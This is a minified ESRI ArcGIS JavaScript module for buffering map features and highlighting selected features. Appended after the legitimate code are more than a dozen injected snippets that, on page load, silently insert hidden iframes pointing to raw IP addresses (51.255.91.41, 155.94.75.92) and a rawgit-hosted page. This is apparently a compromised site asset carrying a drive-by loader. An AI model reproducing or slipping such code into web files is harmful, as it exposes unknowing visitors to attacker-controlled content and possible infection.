// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/array dojo/_base/Color dojo/_base/declare dojo/_base/lang dojo/Deferred dojo/dom-style esri/geometry/geometryEngineAsync esri/geometry/Polygon esri/graphic esri/symbols/SimpleFillSymbol esri/symbols/SimpleLineSymbol esri/tasks/BufferParameters esri/tasks/GeometryService esri/tasks/query esri/tasks/QueryTask".split(" "),function(p,c,r,k,m,n,t,u,v,d,g,w,x,y,z){return r([],{constructor:function(b,a,f,l){this.config=b;this.map=a;this.bufferLayer=f;this.geometryService=l;this.rootFeaturesSymbol=
new d(d.STYLE_SOLID,new g(g.STYLE_SOLID,new c([255,0,0,.65]),2),new c([255,0,0,.35]));this.foundFeaturesSymbol=new d(d.STYLE_SOLID,new g(g.STYLE_SOLID,new c([0,255,0,.65]),2),new c([0,255,0,.35]));this.bufferFeaturesSymbol=new d(d.STYLE_SOLID,new g(g.STYLE_SOLID,new c([0,0,255,.65]),2),new c([0,0,255,.35]));this.intermediateFeaturesSymbol=new d(d.STYLE_SOLID,new g(g.STYLE_SOLID,new c([127,127,127,.65]),2),new c([0,0,255,.35]))},doBuffer:function(b,a,f,l){var e,q,h,c=new m,d=new m;this.clearBufferGraphics();
0!==a?(e=new w,e.bufferSpatialReference=this.map.spatialReference,e.distances=[a],e.geodesic=!0,e.geometries=b,e.outSpatialReference=this.map.spatialReference,e.unit=x.UNIT_METER,this.geometryService.buffer(e,k.hitch(this,function(a){p.forEach(a,function(a){this._createAndAddGraphic(this.rootFeaturesSymbol,a,this.bufferLayer)},this);d.resolve(a)}))):d.resolve(b);d.then(k.hitch(this,function(a){var b=new m;q=new z(this.config.selector.url);h=new y;h.geometry=a[0];h.returnGeometry=!0;h.outFields=this.config.selector.useAsAddresseeLayer?
["*"]:[];f.set({value:Number.POSITIVE_INFINITY});n.set(f.domNode,"display","block");q.executeForExtent(h,k.hitch(this,function(a){console.log(a.count+" selector features found");b.resolve(5E3<a.count?t.intersect(u.fromExtent(a.extent),h.geometry):null)}));q.execute(h,k.hitch(this,function(a){n.set(f.domNode,"display","none");b.then(k.hitch(this,function(b){b?b.then(k.hitch(this,function(b){this._createAndAddGraphic(this.foundFeaturesSymbol,b,this.bufferLayer);c.resolve(a)})):this._highlightFeatureSet(this.foundFeaturesSymbol,
a,l).then(function(){c.resolve(a)})}))}))}));return c},clearBufferGraphics:function(){this.bufferLayer.clear()},_getFeatureGeometries:function(b){return p.map(b,k.hitch(this,function(a){return a.geometry}))},_highlightFeatureSet:function(b,a,f){var c,e,d=new m;0<a.features.length?(c=Math.max(100,Math.round(a.features.length/100)),f.set({value:0}),n.set(f.domNode,"display","block"),e=Math.ceil(a.features.length/c),setTimeout(k.hitch(this,function(){this._highlightFeaturesContinuation(b,a.features,
f,c,e,0,0).then(function(){d.resolve(!0);f.set({value:100});n.set(f.domNode,"display","none")})}),50)):d.resolve(!0);return d},_highlightFeaturesContinuation:function(b,a,f,c,d,g,h){var e,l=new m;if(h>=a.length)return l.resolve(!0),l;e=Math.min(h+c,a.length);this._highlightFeatures(b,a.slice(h,e)).then(k.hitch(this,function(){++g;f.set({value:100*g/d});setTimeout(k.hitch(this,function(){this._highlightFeaturesContinuation(b,a,f,c,d,g,e).then(function(){l.resolve(!0)})}),10)}));return l},_highlightFeatures:function(b,
a){var c=new m;p.forEach(a,function(a){this._createAndAddGraphic(b,a.geometry,this.bufferLayer)},this);c.resolve(!0);return c},_createAndAddGraphic:function(b,a,c){b=new v(a,b,null,null);c.add(b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});